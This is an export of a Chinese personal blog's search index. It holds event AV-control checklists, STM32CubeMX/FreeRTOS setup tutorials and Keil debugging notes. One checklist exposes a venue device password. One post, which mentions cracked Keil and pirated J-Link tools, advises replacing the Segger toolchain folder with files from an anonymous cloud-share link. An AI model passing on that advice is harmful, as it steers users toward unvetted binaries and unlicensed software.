+ 组织<br>解决用户的问题</p><h2 id="节点和系统"><a href="#节点和系统" class="headerlink" title="节点和系统"></a>节点和系统</h2><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><h2 id="终身学习-gt-终身修炼"><a href="#终身学习-gt-终身修炼" class="headerlink" title="终身学习-&gt;终身修炼"></a>终身学习-&gt;终身修炼</h2><ul><li>像小朋友般好奇</li><li>博大精深-技多不压身</li><li>融会贯通-自我见解</li><li>有字书和无字书</li><li>国际视野-外语很重要</li><li>新闻里有大财富</li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>场控注意事项</title>
    <url>/2018/03/31/2018-03-31-backgroud-control/</url>
    <content><![CDATA[<h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><h2 id="启明学院一楼报告厅"><a href="#启明学院一楼报告厅" class="headerlink" title="启明学院一楼报告厅"></a>启明学院一楼报告厅</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li>三台电脑（报告台、视频和音频、主流程ppt）</li><li>电脑软件：<ul><li>Potplayer（视频播放）</li><li>EQ一卡通（LED显示屏）</li><li>vMix（拓展屏的骚操作）</li></ul></li><li>VGA转接线</li><li>插线板</li><li>一台电脑一份资料<ul><li>暖场视频</li><li>各种音乐</li><li>各流程ppt</li><li>主流程ppt</li></ul></li><li>各个视频ppt进行一页一页检查</li><li>流程彩排记录</li><li>报告厅LED显示内容</li><li>启明学院大门LED显示内容</li><li>确定好谁负责什么<ul><li>主席台递话筒</li><li>观众席递话筒</li><li>报告台ppt切换</li><li>主流程ppt切换</li><li>VGA切换</li><li>音视频播放和音量调节</li></ul></li></ul><h3 id="布场"><a href="#布场" class="headerlink" title="布场"></a>布场</h3><p><strong>！！！先拍照，留做最后的对比，场地必须要还原！！！</strong></p><ol><li>打开电闸，第二排全部打开，第一排只开三基色、LED和显示屏</li><li>控制板开启右侧电源，然后点击开始，系统会自动慢慢启动</li><li>需要的话打开辅助投影机和后场电视机</li><li>需要的话用空调遥控器开空调</li><li>话筒电池电量确认</li><li>调试话筒音量和音频视频音量</li><li>调试各个VGA接口，查看是否有切换的适配延时和缺块问题</li><li>音视频电脑把要放的视频音乐打开暂停，设置是否单个循环或列表循环</li><li>主流程ppt和各流程ppt打开到准备界面</li></ol><h3 id="开场"><a href="#开场" class="headerlink" title="开场"></a>开场</h3><ol><li>正式开始前放映暖场视频，循环播放</li><li>开始过程中随机应变</li><li>嘉宾上台放上场音乐</li><li>颁奖放颁奖音乐</li><li>散场放散场音乐</li></ol><h3 id="收场"><a href="#收场" class="headerlink" title="收场"></a>收场</h3><ol><li>空调关闭</li><li>屏幕黑屏</li><li>话筒回收</li><li>确认电池需不需要买</li><li>控制板点击exit</li><li>VGA线回收</li><li>VGA转接线回收</li><li>插线板回收</li><li>等报告厅人走完</li><li><strong>对比照片，还原场地</strong></li><li>关闭电闸，只留下场控室的电源</li><li>收场查看是否有遗漏，叫保安关门</li></ol><h2 id="启明学院十二楼路演区"><a href="#启明学院十二楼路演区" class="headerlink" title="启明学院十二楼路演区"></a>启明学院十二楼路演区</h2><h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><ul><li>一台电脑（要有HDMI，VGA不管用）</li><li>电脑软件：<ul><li>Potplayer（视频播放）</li><li>vMix（拓展屏的骚操作）</li></ul></li><li>各个视频ppt进行一页一页检查</li></ul><h3 id="布场-1"><a href="#布场-1" class="headerlink" title="布场"></a>布场</h3><p><strong>！！！先拍照，留做最后的对比，场地必须要还原！！！</strong></p><ol><li>打开墙上的机器，密码：<em>87558300</em></li><li>打开所需要的灯</li><li>如果显示屏没有亮，到电闸室查看是否跳闸</li><li>需要的话打开旁边墙上的空调</li><li>话筒电池电量确认</li><li>调试HDMI显示屏是否适配</li><li>音视频电脑把要放的视频音乐打开暂停，设置是否单个循环或列表循环</li><li>主流程ppt和各流程ppt打开到准备界面</li></ol><h3 id="开场-1"><a href="#开场-1" class="headerlink" title="开场"></a>开场</h3><ol><li>开始过程中随机应变</li></ol><h3 id="收场-1"><a href="#收场-1" class="headerlink" title="收场"></a>收场</h3><ol><li>空调关闭</li><li>屏幕黑屏</li><li>话筒回收</li><li>确认电池需不需要买</li><li>控制板点击结束</li><li>HDMI线回收</li><li><strong>对比照片，还原场地</strong></li><li>收场查看是否有遗漏，关灯走人</li></ol><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="公共注意事项"><a href="#公共注意事项" class="headerlink" title="公共注意事项"></a>公共注意事项</h2><ul><li><strong>收场需要将场地还原，所以布场先拍照</strong></li><li>照明关不了可以关电闸</li></ul><h2 id="启明学院一楼报告厅-1"><a href="#启明学院一楼报告厅-1" class="headerlink" title="启明学院一楼报告厅"></a>启明学院一楼报告厅</h2><ul><li>7号VGA线与其他VGA线相互转的时候会有一段适配时间，尽量不要使用</li><li>报告台VGA线和主控电脑VGA线用复制屏会缺一块，使用拓展不会有问题</li><li>音量调节不能调节到最高，否则会出现啸叫</li><li>后场电视机用复制也有可能会出现缺块现象，注意一下</li><li>新的设备话筒离得太近会有啸叫</li></ul><h2 id="创业红娘场控checklist"><a href="#创业红娘场控checklist" class="headerlink" title="创业红娘场控checklist"></a>创业红娘场控checklist</h2><ul><li>放映笔要做各种极限测试</li><li>场控要提前加入观众群</li><li>弹幕的放映由主流程ppt控制者放映</li><li>主持人和刘老师对流程的时候场控负责人要在场</li></ul>]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>stm32cubemx使用freertos的介绍</title>
    <url>/2018/03/30/2018_03_16_stm32cubemx_freeRTOS/</url>
    <content><![CDATA[<p>本博客仅为自己在使用时的总结，希望有所帮助</p><h2 id="程序环境"><a href="#程序环境" class="headerlink" title="程序环境"></a>程序环境</h2><ul><li>系统 <code>Windows10 1709</code></li><li>软件 <code>stm32cubemx 4.25.0</code></li><li>编译软件 <code>keil-mdk arm 5.24</code></li><li>语言 <code>C语言</code></li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是在上一篇文章（<a href="/2018/03/30/2018_03_16_stm32cubemx_config/">stm32cubemx配置介绍</a>）的基础上，利用freeRTOS的一些介绍，希望对想要了解或者使用freeRTOS的码友们提供帮助。本文只是自己在使用时的总结，仅供参考。</p>]]></content>
      <categories>
        <category>Software Usage</category>
        <category>Stm32cubemx</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>stm32cubemx配置介绍</title>
    <url>/2018/03/30/2018_03_16_stm32cubemx_config/</url>
    <content><![CDATA[<p>本博客仅为自己在使用时的总结，希望有所帮助</p><h2 id="程序环境"><a href="#程序环境" class="headerlink" title="程序环境"></a>程序环境</h2><ul><li>系统 <code>Windows10 1709</code></li><li>软件 <code>stm32cubemx 4.25.0</code></li><li>编译软件 <code>keil-mdk arm 5.24</code></li><li>语言 <code>C语言</code></li><li>单片机 <code>stm32f030c8t6</code></li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>stm32cubemx是一款对于stm32系列单片机的可视化编程配置软件，编写stm32系列几乎所有单片机的码农可以尝试这个软件，本文只是自己在使用时的总结，虽然使用的单片机为stm32f030c8t6，但是大体框架还是差不多的，基本可以通用，仅供参考。</p><h2 id="新建工程"><a href="#新建工程" class="headerlink" title="新建工程"></a>新建工程</h2><p>打开软件就看到朴实无华的界面（明明是设计太差），中间是一个stm32cube图，左侧是三个蓝色字段：New Project，Load Project，Help。不用想，直接点击New Project，新建工程。</p><img src="/2018/03/30/2018_03_16_stm32cubemx_config/2018_03_16_01.png" width="80%"><p>之后会先检查网络，然后更新…</p><p>然后出现了New Project的选项卡，里面有stm32系列几乎所有芯片，并且包括<code>报价、Flash、RAM、IO数、频率</code>，选中一个型号还可以直接点击上方的datasheet直接下载相应datasheet来参考。选中一个型号的芯片，双击或者点选上方的start project。</p><img src="/2018/03/30/2018_03_16_stm32cubemx_config/2018_03_16_02.png" width="80%"><p>出现了一个芯片的图，引脚顺序按照实际封装设置的，左侧是各种配置的外设，可以直接点选来配置，而且有相应的freeRTOS以及fatfs的支持，如果芯片支持usb还会有usb的配置选项。并且如果某个外设被配置到一个引脚，影响了其他外设，会直接在相应选项上显示红色，表示不可配置，十分友好。</p><img src="/2018/03/30/2018_03_16_stm32cubemx_config/2018_03_16_03.png" width="80%"><p>新建工程到这里就结束了。</p><h2 id="配置RCC时钟"><a href="#配置RCC时钟" class="headerlink" title="配置RCC时钟"></a>配置RCC时钟</h2><p>工程新建完成后就是配置RCC时钟了，首先要确定芯片有没有外接晶振，一般开发板或者实物都会外接一个8M高速晶振。我就根据外接8M晶振来配置单片机。</p><p>首先在列表左侧将<code>RCC</code>下的<code>High Speed Clock(HSE)</code>选为<code>Crystal/Ceramic Resonator</code>，然后在上面大分层中的<code>Clock Configuration</code>页面将<code>input frequency</code>设置为8，将<code>PLL Source Mux</code>点选<code>HSE</code>，然后将<code>HCLK</code>设置为最大48MHz(也可根据自己需要设置)，回车会询问是否自动配置时钟，选择是即可自动将各种时钟配置完成。</p><img src="/2018/03/30/2018_03_16_stm32cubemx_config/2018_03_21_01.png" width="80%"><h2 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a><span id="create_code">生成代码</span></h2><p>由于我使用的是<code>keil mdk arm 5.24</code>来编译和烧写stm32单片机，所以只讲如何生成<code>keil-mdk</code>的代码工程。</p><p>点击菜单栏的<code>Project</code>下的<code>Generate Code</code>，然后出现的配置菜单中选择<code>Toolchain / IDE</code>为<code>MDK-ARM V5</code>，然后选择好工程名字和目录，点击OK即可。一般会让你下载相应系列芯片的库，如果觉得软件下载太慢，直接去<a href="http://www.st.com/content/st_com/zh/products/development-tools/software-development-tools/stm32-software-development-tools/stm32-configurators-and-code-generators/stm32cubemx.html" target="_blank" rel="noopener">官网</a>下载即可，然后注意修改下方的固件库目录到你下载的目录即可。</p><img src="/2018/03/30/2018_03_16_stm32cubemx_config/2018_03_21_05.png" width="80%"><p>生成完成选择<code>open project</code>就可以打开工程进行自己的代码编写了。但是自己写的代码一定要在两个注释的中间</p><pre><code>/* USER CODE BEGIN 2 */

/* USER CODE END 2 */</code></pre><p>否则再次生成工程时会被洗掉。编译成功下载即可。</p><h2 id="配置GPIO"><a href="#配置GPIO" class="headerlink" title="配置GPIO"></a>配置GPIO</h2><p>单片机最基础的是GPIO的配置，做完GPIO的配置就可以点灯来验证程序是否运行了。GPIO分为输入和输出两个方向，分别讲解。</p><h3 id="GPIO输出配置"><a href="#GPIO输出配置" class="headerlink" title="GPIO输出配置"></a>GPIO输出配置</h3><p>GPIO的配置比较简单，直接点选芯片引脚相应的GPIO引脚，比如我手上开发板的<code>PC13</code>为<code>LED</code>，就选择<code>PC13</code>为<code>GPIO_Output</code>。</p><img src="/2018/03/30/2018_03_16_stm32cubemx_config/2018_03_21_02.png" width="80%"><p>然后到大分层中的<code>Configuration</code>一栏中选择<code>System</code>下的GPIO，然后在出现的界面中选择配置的引脚，选择输出为高还是低，输出模式(<a href="https://www.douban.com/note/206867792/" target="_blank" rel="noopener">push pull 和 open drain</a>)，是否上下拉和GPIO输出速度。</p><img src="/2018/03/30/2018_03_16_stm32cubemx_config/2018_03_21_03.png" width="80%"><p>点击OK即可。</p><h3 id="GPIO输入配置"><a href="#GPIO输入配置" class="headerlink" title="GPIO输入配置"></a>GPIO输入配置</h3><p>输入配置和输出类似，选择<code>GPIO_Input</code>，然后在选项中选择好上下拉即可。</p><img src="/2018/03/30/2018_03_16_stm32cubemx_config/2018_03_21_04.png" width="80%"><h3 id="代码控制"><a href="#代码控制" class="headerlink" title="代码控制"></a>代码控制</h3><p>输出的控制函数为</p><pre><code>HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_SET);</code></pre><p>读取的函数为</p><pre><code>HAL_GPIO_ReadPin(GPIOC, GPIO_PIN_13);</code></pre><p>可以用这两个函数控制灯的闪烁了。</p>]]></content>
      <categories>
        <category>Software Usage</category>
        <category>Stm32cubemx</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>keil5烧写程序后闪退的解决方案</title>
    <url>/2018/03/30/2018_03_13_keil524_quit/</url>
    <content><![CDATA[<p>本博客仅为自己记录所遇到的问题的解决方案，希望有所帮助</p><h2 id="问题环境"><a href="#问题环境" class="headerlink" title="问题环境"></a>问题环境</h2><ul><li>系统 <code>Windows10 1709</code></li><li>软件 <code>keil-mdk arm 5.24</code></li><li>单片机 <code>stm32f030c8t6</code></li><li>烧写器 <code>jlink-v8</code></li></ul><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>&emsp;&emsp;keil编译成功，用jlink烧写进片子之后， keil停止工作。经验证代码烧进了片子， 程序可以正常运行。</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>&emsp;&emsp;猜测是因为keil是破解版，jlink是盗版的，出现兼容问题。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>替换keil安装目录下的Segger文件:</p><ul><li>网上下载一个<a href="https://pan.baidu.com/s/1Bl4Q4RQkP-Ba9V8qdO9NFQ" target="_blank" rel="noopener">Segger</a>文件替换<code>keil_program\ARM\Segger</code>文件夹下全部内容即可。</li></ul>]]></content>
      <categories>
        <category>Debug</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>keil5常见编译错误的原因</title>
    <url>/2018/03/30/2018_03_16_keil524_error_warning/</url>
    <content><![CDATA[<p>本博客仅为自己记录所遇到的问题的解决方案，希望有所帮助</p><h2 id="程序环境"><a href="#程序环境" class="headerlink" title="程序环境"></a>程序环境</h2><ul><li>系统 <code>Windows10 1709</code></li><li>软件 <code>keil-mdk arm 5.24</code></li><li>语言 <code>C语言</code></li></ul><h2 id="问题和原因及解决方案"><a href="#问题和原因及解决方案" class="headerlink" title="问题和原因及解决方案"></a>问题和原因及解决方案</h2><h3 id="warnings"><a href="#warnings" class="headerlink" title="warnings"></a>warnings</h3><h4 id="1、函数隐式声明"><a href="#1、函数隐式声明" class="headerlink" title="1、函数隐式声明"></a>1、函数隐式声明</h4><blockquote><p>warning: #223-D: function “xxxx()” declared implicitly</p></blockquote><p>一般为头文件未包含，但是c文件被编译器编译了，但是在函数被调用的地方没有包含头文件，所以报了一个warning。有些时候会被当做空函数执行，有时没有影响，养成习惯包含头文件。</p><h3 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h3>]]></content>
      <categories>
        <category>Debug</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
</search>
